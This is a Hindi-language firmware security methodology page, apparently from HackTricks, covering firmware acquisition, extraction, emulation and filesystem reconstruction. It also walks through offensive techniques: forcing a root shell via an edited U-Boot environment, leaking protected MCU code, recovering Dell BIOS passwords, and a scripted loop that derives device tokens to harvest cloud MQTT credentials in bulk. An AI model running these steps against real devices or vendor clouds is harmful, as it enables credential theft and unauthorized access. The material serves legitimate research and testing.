# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **परिचय**

### संबंधित संसाधन

खुले हुए hardware interfaces से firmware प्राप्त करने के लिए, [UART console-assisted firmware dumping](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) और [SPI flash dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms) देखें। Console access से पहले boot-time UART capture को दोहराने योग्य तरीके से करने के लिए, [SCPI-controlled power and oscilloscope acquisition](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi) देखें।

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware वह आवश्यक software है जो hardware components और उपयोगकर्ताओं के संपर्क में आने वाले software के बीच संचार को प्रबंधित और सुगम बनाकर devices को सही ढंग से काम करने में सक्षम बनाता है। इसे स्थायी memory में रखा जाता है, ताकि device के चालू होते ही वह आवश्यक निर्देशों तक पहुँच सके और operating system शुरू हो सके। Security vulnerabilities की पहचान करने के लिए firmware की जाँच करना और उसमें संभावित बदलाव करना एक महत्वपूर्ण कदम है।<sup>[[2]](#references)[[3]](#references)</sup>

## **जानकारी जुटाना**

**जानकारी जुटाना** किसी device की बनावट और उसमें इस्तेमाल की गई technologies को समझने का एक महत्वपूर्ण शुरुआती कदम है। इस प्रक्रिया में इन चीज़ों से जुड़ा data इकट्ठा किया जाता है:

- CPU architecture और उस पर चलने वाला operating system
- Bootloader से जुड़ी जानकारी
- Hardware layout और datasheets
- Codebase metrics और source locations
- External libraries और license types
- Update histories और regulatory certifications
- Architecture और flow diagrams
- Security assessments और पहचानी गई vulnerabilities

इस काम के लिए **open-source intelligence (OSINT)** tools बेहद उपयोगी हैं। उपलब्ध open-source software components का manual और automated review के ज़रिए विश्लेषण करना भी महत्वपूर्ण है। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसे tools मुफ़्त static analysis देते हैं, जिनका उपयोग संभावित समस्याएँ खोजने के लिए किया जा सकता है।

## **Firmware प्राप्त करना**

Firmware प्राप्त करने के कई तरीके हैं, जिनमें से हर एक की जटिलता अलग-अलग होती है:

- स्रोत (developers, manufacturers) से **सीधे**
- दिए गए निर्देशों के अनुसार **build करके**
- आधिकारिक support sites से **download करके**
- उपलब्ध firmware files खोजने के लिए **Google dork** queries का उपयोग करके
- [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे tools से **cloud storage** तक सीधे पहुँचकर
- Man-in-the-middle techniques से **updates** को intercept करके
- **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash), या **PICit** जैसे connections के ज़रिए device से **extract करके**
- Device communication में update requests को **sniff करके**
- **Hardcoded update endpoints** की पहचान करके उनका उपयोग करके
- Bootloader या network से **dump करके**
- बाकी सभी तरीके विफल होने पर, उपयुक्त hardware tools का उपयोग करके storage chip को **निकालकर और पढ़कर**

### केवल UART logs: flash में U-Boot env के ज़रिए root shell को बाध्य करना

अगर UART RX को अनदेखा किया जाता है (केवल logs), तो भी आप **U-Boot environment blob को offline edit करके** init shell को बाध्य कर सकते हैं:<sup>[[6]](#references)</sup>

1. SOIC-8 clip और programmer (3.3V) की मदद से SPI flash dump करें:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partition का पता लगाएँ, `bootargs` में `init=/bin/sh` शामिल करने के लिए उसे संपादित करें, और blob के लिए **U-Boot env CRC32 फिर से गणना करें**।
3. केवल env partition को फिर से flash करें और reboot करें; UART पर shell दिखाई देना चाहिए।

यह उन embedded devices पर उपयोगी है जहाँ bootloader shell disabled है, लेकिन external flash access के ज़रिए env partition में लिखा जा सकता है।

### Firewall copy task के ज़रिए protected code उजागर करना

कुछ MCUs में unprotected application code, protected Flash को सीधे पढ़ने के बजाय protected-region gateway को call कर सकता है। Application code execution हासिल करने के बाद, हर gateway task को अलग memory-transfer primitive के रूप में देखें। Cypherock X1 के मामले में, STM32L4 Firewall call gate एक task, external `data` pointer, length और protected `address` स्वीकार करता था। एक write task, Firewall Code के भीतर मौजूद `data` source pointer को अस्वीकार करने में विफल रहा। Caller उस code को सीधे नहीं पढ़ सकता था, फिर भी gateway उसे protected non-volatile storage में copy कर सकता था, जिसे एक अनुमत read task के ज़रिए उजागर किया जा सकता था।<sup>[[15]](#references)</sup>

इस तरह के disclosure को दोहराने के लिए, संबंधित read task वाला writable protected storage page ढूँढ़ें, write source को क्रमिक protected-code addresses पर सेट करें और staged bytes को वापस पढ़ें। बार-बार लिखने से पहले storage medium जाँचें: इस मामले में वह Flash था, इसलिए page को दोबारा इस्तेमाल करने से पहले erase करना ज़रूरी था। शोधकर्ताओं ने एक ऐसी routine का उपयोग किया जो valid Secure Data Storage contents को erase करके restore करती थी, फिर wallet data को overwrite करने के बजाय बची हुई free space में code stage करती थी। इसके लिए MCU पर code execution और call gate तक पहुँच होना ज़रूरी है; यह unauthenticated host से सीधे read bypass करने का तरीका नहीं है।<sup>[[15]](#references)</sup>

Recovered code से [firmware-update और boot-integrity trust gaps](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata) उजागर हो सकते हैं।<sup>[[15]](#references)</sup>

## फर्मवेयर का विश्लेषण

अब जब आपके पास **firmware है**, तो आपको यह जानने के लिए उससे जानकारी निकालनी होगी कि उसके साथ कैसे काम करना है। इसके लिए आप अलग-अलग tools इस्तेमाल कर सकते हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

अगर उन tools से ज़्यादा कुछ न मिले, तो `binwalk -E <bin>` से image की **entropy** जाँचें। अगर entropy कम है, तो उसके encrypted होने की संभावना कम है। अगर entropy ज़्यादा है, तो संभवतः वह encrypted है (या किसी तरह compressed है)।

इसके अलावा, firmware के **अंदर embedded files** निकालने के लिए आप इन tools का इस्तेमाल कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या file का निरीक्षण करने के लिए [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) का इस्तेमाल कर सकते हैं।

### External flash में raw display assets

External SPI dump ज़रूरी नहीं कि MCU का executable firmware हो। Cortex-M target के लिए, हर संभावित code region की शुरुआत की तुलना device के memory map से करें: सामान्य vector table की शुरुआत में एक ऐसा SRAM stack pointer और reset-handler address होता है, जो executable memory में मौजूद हो। Offset zero पर vector table न मिलने से यह साबित नहीं होता कि पूरी chip में code नहीं है; अन्य offsets और boot arrangement भी जाँचें। अगर `binwalk` को कोई container न मिले, तो raw bytes का निरीक्षण करें और [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) से मिले flash read addresses को नई screens load करने वाली गतिविधियों से मिलाएँ।<sup>[[14]](#references)</sup>

Display-asset region के लिए, PNG/JPEG मान लेने के बजाय pixel formats और dimensions के संभावित विकल्प आज़माएँ। उद्धृत device में **80×160 RGB565 little-endian** frames का इस्तेमाल किया गया था: प्रति pixel दो bytes होने के कारण, एक frame **25,600 bytes** (25 KiB) का होता है, 24 kilobits का नहीं। एक decoded flash-read address से screen asset का offset पहचाना गया; researcher ने `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb` से तैयार image convert की, original dump में उसी आकार के asset को उससे बदला, `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` से उसे लिखा और display पर नई image की पुष्टि की। यह writable *external display assets* को दिखाता है, MCU के internal firmware को निकालने या फिर से flash करने को नहीं। किसी भी write से पहले original dump सुरक्षित रखें और dimensions, byte order, offset तथा replacement length की पुष्टि करें।<sup>[[14]](#references)</sup>

### Differential flash analysis और recover किए जा सकने वाले XOR secret stores

जब किसी firmware setting का storage format documented न हो, तो पहले एक जैसी कई flash reads लें, **सिर्फ़ एक** setting बदलें, फिर पूरी chip को दोबारा dump करें और offsets की तुलना करें। इस प्रयोग को नियंत्रित values के साथ दोहराने से setting में हुए बदलावों को counters और write metadata से अलग पहचाना जा सकता है; अगर बदलाव उसी जगह के बजाय नए offsets पर हों, तो store append-only या log-structured हो सकता है। Deleted/tombstoned entries को सुरक्षित रखें, क्योंकि उनके payload bytes अब भी recover किए जा सकते हैं।<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

क्षेत्र का पता लगाने के बाद, `binwalk` जैसे टूल से firmware modules निकालें और Ghidra में writer/validator को reverse करें। कोड में field की सीमाओं, padding, key indexing और key derivation की पुष्टि करें—सिर्फ ciphertext patterns से scheme का अनुमान न लगाएँ।<sup>[[12]](#references)</sup>

#### एन्क्रिप्टेड zero padding से keys पुनर्प्राप्त करें

जैसा कि [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) में बताया गया है, known plaintext से उन्हीं offsets पर keystream bytes का पता चलता है। जब repeating XOR key का हर index किसी fixed-size field की zero padding में शामिल हो, तो वह field विशेष रूप से असुरक्षित होता है: encrypted padding से key bytes सीधे मिल जाते हैं, क्योंकि `0x00 XOR key_byte = key_byte`। यदि key का हर index शामिल है, तो ciphertext के आखिरी हिस्से से key को पुनर्निर्मित करें और भरे हुए bytes को decrypt करें।<sup>[[12]](#references)</sup>

Dell का असुरक्षित DVAR BIOS-password format इसका ठोस उदाहरण है: 32-byte field का byte `0` plaintext होता है, जबकि bytes `1..31` में 20-byte key को दोहराकर इस्तेमाल किया जाता है।<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

पासवर्ड की लंबाई `L` होने पर, XOR से पहले `L..31` स्थानों पर शून्य था। जब `L <= 12` होता है, तो ये स्थान हर key index को कवर करते हैं, इसलिए brute force के बिना पूरी key और पासवर्ड रिकवर हो जाते हैं:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### ऐतिहासिक रिकॉर्ड से keys निकालें

हर रिकॉर्ड का अलग-अलग विश्लेषण न करें। DVAR key लगभग `modified_md5(device_seed || variable_GUID || password[0])` से derive होती है: device seed और GUID स्थिर होते हैं, और password पर निर्भर एकमात्र input clear first byte होता है। इससे प्रति device अधिकतम 256 keys बनती हैं और एक ही byte से शुरू होने वाले रिकॉर्ड एक ही key साझा करते हैं। Active और deleted रिकॉर्ड को उस byte के आधार पर समूहित करें; एक छोटा historical रिकॉर्ड padding के ज़रिए पूरी key leak कर सकता है और किसी मौजूदा लंबे रिकॉर्ड को decrypt कर सकता है, जबकि उस रिकॉर्ड की अपनी padding अपर्याप्त हो। इसलिए password rotation exposure बढ़ा सकती है, अगर पुराने ciphertext को मिटाने के बजाय tombstone किया जाए।<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) tool DVAR का पता लगाता है, candidate रिकॉर्ड को validate करता है, passwords recover करता है और raw stored/key bytes दिखा सकता है। इसे checkout से build करें और verified flash image को इस तरह scan करें:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

कस्टम पार्सर के लिए, रिकॉर्ड संरचना, प्रिंटेबल-कैरेक्टर की शर्तों, ज़ीरो-पैडिंग जाँचों, key entropy और जहाँ key wrap होती है वहाँ consistency के आधार पर false positives को अस्वीकार करें। यदि बार-बार लिए गए dumps में हर write पर कुछ ही bit flips दिखें, तो देखे गए masks की सूची बनाएँ और इन शर्तों के आधार पर संभावित सुधारों को रैंक करें, लेकिन heuristic output को सटीक recovery के रूप में प्रस्तुत करने के बजाय अस्पष्ट characters की रिपोर्ट करें।<sup>[[12]](#references)</sup>

Password verifiers में reversible ciphertext के बजाय salted, iterated one-way hash संग्रहित होना चाहिए, और log-structured stores में superseded secret material को सुरक्षित रूप से हटाया जाना चाहिए।<sup>[[12]](#references)</sup>

### फ़ाइलसिस्टम प्राप्त करना

पिछले टिप्पणी किए गए टूल, जैसे `binwalk -ev <bin>`, से आप **फ़ाइलसिस्टम extract** कर पाए होंगे।\
Binwalk आमतौर पर इसे **फ़ाइलसिस्टम के प्रकार के नाम वाले फ़ोल्डर** में extract करता है, जो आमतौर पर इनमें से एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs।

#### मैन्युअल फ़ाइलसिस्टम Extraction

कभी-कभी, binwalk के signatures में **फ़ाइलसिस्टम का magic byte नहीं होता**। ऐसे मामलों में, binwalk का उपयोग करके **फ़ाइलसिस्टम का offset खोजें और binary से compressed फ़ाइलसिस्टम को carve करें**, फिर नीचे दिए गए चरणों के अनुसार उसके प्रकार के आधार पर फ़ाइलसिस्टम को **मैन्युअल रूप से extract** करें।

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs filesystem की carving करने के लिए निम्नलिखित **dd command** चलाएँ।

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

वैकल्पिक रूप से, निम्न command भी चलाई जा सकती है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs के लिए (ऊपर दिए गए उदाहरण में उपयोग किया गया)

`$ unsquashfs dir.squashfs`

इसके बाद फ़ाइलें "`squashfs-root`" directory में होंगी।

- CPIO archive फ़ाइलें

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs filesystems के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### विभाजित embedded root filesystems का पुनर्निर्माण

यदि raw eMMC/SSD dump में filesystem header मान्य है, लेकिन उसके metadata offsets nominal partition की सीमा से आगे तक जाते हैं, तो उसे तुरंत corrupt न मानें। Embedded boot code, Device Mapper का उपयोग करके कई physical ranges से वास्तविक root device बना सकता है, इसलिए एक GPT partition को carve करने पर केवल पहला segment मिलता है।<sup>[[9]](#references)</sup>

#### पूरी media image की प्रारंभिक जांच करें

पहले पुष्टि करें कि acquisition पूरा हो चुका है, size स्थिर है, और कोई writer अब भी image को उपयोग में नहीं ले रहा है। यदि filename में start/end address दिया गया है, तो उस range की तुलना वास्तविक byte count से करें। GPT को read-only mode में recover करें और केवल आवश्यक range attach करें; workstation पर किसी untrusted physical volume के लिए `vgchange -ay` **न चलाएँ**, क्योंकि volume-group collisions और अनचाहे writes हो सकते हैं।<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

डिस्पोज़ेबल VM का उपयोग करें, जब मूल init logic या LVM stack को पूरी image देखनी हो। मानक boot partition के ऐतिहासिक boot logs विशेष रूप से उपयोगी होते हैं: bootloader ने proprietary-container offsets, component lengths, slot selection, alignment rules और signature verification लॉग किए हो सकते हैं। इन मानों का उपयोग करके embedded command line/kernel/initramfs को carve करें, फिर प्रत्येक output को `file`, magic bytes और `binwalk` से स्वतंत्र रूप से validate करें; container के अंत तक पढ़ने से गलती से kernel के साथ initrd, ACPI object या signature भी जुड़ सकता है।<sup>[[9]](#references)</sup>

#### Boot-time block map पुनर्प्राप्त करें

Kernel का initramfs extract करें और उसके `/init` तथा किसी भी storage libraries को reverse करें। [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) में `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` और partition paths के string references देखें; फिर उस code को trace करें जो active A/B slot चुनता है और table बनाता है। radare2 के लिए उपयोगी शुरुआती बिंदु हैं `r2 -A init`, `afl`, `pdf @ main` और `pdf @ fcn.xxxxx`।<sup>[[9]](#references)</sup>

Linear target, virtual device की लगातार ranges को एक या अधिक backing devices की ranges पर map करता है। पुनर्प्राप्त की गई दो-segment table का आकार आम तौर पर ऐसा होता है (सभी positions और lengths 512-byte sectors में हैं):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

मशीन-कोड के arithmetic को ठीक उसी तरह दोहराएँ, जिसमें integer की width, shifts और unit conversions शामिल हैं। उदाहरण के लिए, निम्नलिखित expression byte size को पहले 4-KiB boundary तक नीचे round करता है और उसके बाद ही उसे 512-byte sectors में convert करता है; इसे `p4_bytes // 512` से बदलने पर, जब भी partition page-aligned न हो, चुना गया tail `p4_bytes % 4096` से खिसक जाता है।<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

टेबल के क्रम में ranges को सीमित chunks में कॉपी करके एक flat analysis image पुनर्निर्मित करें, बजाय इसके कि पूरे media dump को memory में लोड किया जाए। इससे host-side mapper devices बनाने से भी बचा जा सकता है। GPT से प्राप्त offsets, उलटी sector counts और परिणामी output length को अलग-अलग assertions के रूप में रखें।<sup>[[9]](#references)</sup>

#### भ्रष्टाचार और स्थिर पुनर्निर्माण त्रुटि में अंतर करें

SquashFS के लिए, `unsquashfs` चलाने से पहले `hsqs` magic की जाँच करें और superblock offset 40 पर little-endian 64-bit `bytes_used` field को decode करें। यदि कई असंबंधित structures में extraction विफल हो, तो अपेक्षित positions के आसपास एक व्यापक window में खोज करें और मजबूत structural candidates की पुष्टि करें: decompressible metadata block, लगातार कई valid directory entries, संभावित inode fields, inode count के अनुरूप root inode, या valid integrity-metadata structure। केवल एक magic match पर्याप्त नहीं है।<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

जब एक ही signed delta स्वतंत्र संरचनाओं को वैध बनाता है—उदाहरण के लिए, directory metadata और verity record—तो संभावित कारण bytes की कमी नहीं, बल्कि segment-start की व्यवस्थित त्रुटि है। orphan recovery या filesystem metadata को patch करने की कोशिश करने से पहले, उलटी arithmetic पर लौटें और discarded remainders, signedness, overflow, या sector/page rounding की जाँच करें।<sup>[[9]](#references)</sup>

अंत में, protection boundaries को अलग रखें: TPM-sealed LUKS volumes डेटा की गोपनीयता की रक्षा करते हैं, जबकि signed dm-verity mapping root-filesystem की integrity की रक्षा करता है। Software TPM, मूल physical TPM से seal की गई key को recover नहीं कर सकता; और verity verification छोड़ने वाले research-only init के ज़रिए modified SquashFS को boot करने से उसका signature forge नहीं होता और न ही dm-verity टूटता है।<sup>[[9]](#references)</sup>

## Firmware का विश्लेषण

Firmware प्राप्त हो जाने के बाद, उसकी संरचना और संभावित vulnerabilities को समझने के लिए उसका विश्लेषण करना ज़रूरी है। इस प्रक्रिया में firmware image का विश्लेषण करने और उससे उपयोगी डेटा निकालने के लिए विभिन्न tools का उपयोग किया जाता है।

### शुरुआती विश्लेषण के Tools

अतिरिक्त firmware-analysis tools और जानकारी के लिए, [Third-Party Tools and Resources का firmware section](../../generic-methodologies-and-resources/third-party-tools-and-resources.md#firmware) देखें।

Binary file (जिसे `<bin>` कहा गया है) की शुरुआती जाँच के लिए commands का एक सेट दिया गया है। ये commands file types की पहचान करने, strings निकालने, binary data का विश्लेषण करने और partition तथा filesystem की जानकारी समझने में मदद करती हैं:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

इमेज की encryption स्थिति का आकलन करने के लिए, `binwalk -E <bin>` से **entropy** जाँची जाती है। कम entropy encryption की कमी का संकेत देती है, जबकि अधिक entropy संभावित encryption या compression दर्शाती है।

**embedded files** निकालने के लिए, **file-data-carving-recovery-tools** दस्तावेज़ और फ़ाइलों की जाँच के लिए **binvis.io** जैसे टूल और संसाधनों की अनुशंसा की जाती है।

### फ़ाइलसिस्टम निकालना

`binwalk -ev <bin>` का उपयोग करके आमतौर पर फ़ाइलसिस्टम निकाला जा सकता है, अक्सर फ़ाइलसिस्टम के प्रकार के नाम वाली डायरेक्टरी में (जैसे, squashfs, ubifs)। हालाँकि, जब **binwalk** magic bytes न होने के कारण फ़ाइलसिस्टम के प्रकार को पहचान नहीं पाता, तो उसे मैन्युअल रूप से निकालना आवश्यक होता है। इसमें `binwalk` से फ़ाइलसिस्टम का offset ढूँढ़ना और फिर फ़ाइलसिस्टम को carve out करने के लिए `dd` कमांड का उपयोग करना शामिल है:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

इसके बाद, filesystem के प्रकार (जैसे squashfs, cpio, jffs2, ubifs) के आधार पर, contents को manually extract करने के लिए अलग-अलग commands का उपयोग किया जाता है।

### Filesystem Analysis

Filesystem extract हो जाने के बाद, security flaws की तलाश शुरू होती है। असुरक्षित network daemons, hardcoded credentials, API endpoints, update server की functionalities, uncompiled code, startup scripts और offline analysis के लिए compiled binaries पर ध्यान दिया जाता है।

जाँचने के लिए **मुख्य स्थानों** और **items** में शामिल हैं:

- User credentials के लिए **etc/shadow** और **etc/passwd**
- **etc/ssl** में SSL certificates और keys
- संभावित vulnerabilities के लिए configuration और script files
- आगे के analysis के लिए embedded binaries
- आम IoT device web servers और binaries

Filesystem में sensitive information और vulnerabilities खोजने में कई tools मदद करते हैं:

- Sensitive information खोजने के लिए [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker)
- व्यापक firmware analysis के लिए [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Static और dynamic analysis के लिए [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) और [**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binaries पर Security Checks

Filesystem में मिले source code और compiled binaries—दोनों की vulnerabilities के लिए बारीकी से जाँच करनी चाहिए। Unix binaries के लिए **checksec.sh** और Windows binaries के लिए **PESecurity** जैसे tools उन असुरक्षित binaries की पहचान करने में मदद करते हैं जिनका exploit किया जा सकता है।

## Derived URL tokens के ज़रिए cloud config और MQTT credentials हासिल करना

कई IoT hubs हर device का configuration ऐसे cloud endpoint से fetch करते हैं:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis के दौरान आपको पता चल सकता है कि `<token>` को device ID से locally, hardcoded secret का उपयोग करके derive किया जाता है। उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) और इसे uppercase hex के रूप में दर्शाया जाता है

इस design से कोई भी व्यक्ति, जिसे deviceId और STATIC_KEY पता हों, URL को फिर से बना सकता है और cloud config प्राप्त कर सकता है। इससे अक्सर plaintext MQTT credentials और topic prefixes का पता चलता है।

व्यावहारिक प्रक्रिया:

1) UART boot logs से deviceId निकालें

- 3.3V UART adapter (TX/RX/GND) connect करें और logs capture करें:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- cloud config URL pattern और broker address प्रिंट करने वाली lines खोजें, उदाहरण के लिए:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmware से STATIC_KEY और token algorithm पुनर्प्राप्त करें

- Binaries को Ghidra/radare2 में load करें और config path ("/pf/") या MD5 usage खोजें।
- Algorithm की पुष्टि करें (जैसे, MD5(deviceId||STATIC_KEY))।
- Bash में token निकालें और digest को uppercase करें:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud config और MQTT credentials हासिल करें

- URL बनाएं और curl से JSON प्राप्त करें; secrets निकालने के लिए jq से parse करें:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) plaintext MQTT और कमजोर topic ACLs का दुरुपयोग करें (यदि मौजूद हों)

- रखरखाव topics को subscribe करने और संवेदनशील events खोजने के लिए recovered credentials का उपयोग करें:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) अनुमानित device IDs की enumeration करें (बड़े पैमाने पर, authorization के साथ)

- कई ecosystems में vendor OUI/product/type bytes के बाद एक sequential suffix होता है।
- आप candidate IDs पर iterate करके, programmatically tokens derive कर सकते हैं और configs fetch कर सकते हैं:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

नोट्स
- बड़े पैमाने पर enumeration करने से पहले हमेशा स्पष्ट authorization प्राप्त करें।
- जब संभव हो, target hardware में बदलाव किए बिना secrets प्राप्त करने के लिए emulation या static analysis को प्राथमिकता दें।

Firmware को emulate करने की प्रक्रिया किसी device के संचालन या किसी एक program का **dynamic analysis** करने में सक्षम बनाती है। इस तरीके में hardware या architecture dependencies से जुड़ी चुनौतियाँ आ सकती हैं, लेकिन root filesystem या खास binaries को समान architecture और endianness वाले device, जैसे Raspberry Pi, या पहले से तैयार virtual machine में स्थानांतरित करने से आगे की testing में मदद मिल सकती है।

### अलग-अलग Binaries को Emulate करना

एकल programs की जाँच के लिए, program की endianness और CPU architecture की पहचान करना महत्वपूर्ण है।

#### MIPS Architecture का उदाहरण

MIPS architecture binary को emulate करने के लिए, यह command इस्तेमाल की जा सकती है:

```bash
file ./squashfs-root/bin/busybox
```

और आवश्यक emulation tools इंस्टॉल करने के लिए:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS (big-endian) के लिए `qemu-mips` का उपयोग किया जाता है, और little-endian binaries के लिए `qemu-mipsel` उपयुक्त विकल्प होगा।

#### ARM Architecture Emulation

ARM binaries के लिए प्रक्रिया समान है; emulation के लिए `qemu-arm` emulator का उपयोग किया जाता है।

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) और अन्य tools full firmware emulation को आसान बनाते हैं, प्रक्रिया को automate करते हैं और dynamic analysis में सहायता करते हैं।

### Emulation के लिए split और verified root filesystems को फिर से बनाना

अगर SquashFS superblock पढ़ा जा सकता है, लेकिन inode, directory या fragment-table offsets असंभव लगते हैं, तो तुरंत `unsquashfs` को patch न करें। Early boot binary को reverse करें और उसके द्वारा बनाए गए block-device graph को दोबारा तैयार करें: embedded systems में nominal root partition दिखाई दे सकता है, लेकिन वास्तविक filesystem `dm-linear` mapping से बनाया जा सकता है, जो किसी अन्य partition से लिए गए sectors को जोड़ती है। केवल superblock की जाँच सफल हो सकती है, भले ही उसके बाद के सभी metadata blocks अपनी सही जगह से खिसके हों।<sup>[[11]](#references)</sup>

Firmware की arithmetic को बिल्कुल उसी तरह बनाए रखें। खास तौर पर, पता करें कि lengths bytes, 512-byte sectors या 4 KiB pages में हैं; shifts और truncation को उनके मूल क्रम में दोहराएँ; और A/B layouts में bank पर निर्भर tail regions का हिसाब रखें। उदाहरण के लिए, `(partition_bytes >> 12) << 3` पहले 4 KiB boundary तक truncate करता है और उसके बाद ही परिणाम को 512-byte sectors में व्यक्त करता है; इसे `partition_bytes // 512` से बदलने पर जोड़ा गया extent कुछ kilobytes खिसक सकता है और आगे की सभी SquashFS tables corrupt हो सकती हैं।<sup>[[11]](#references)</sup>

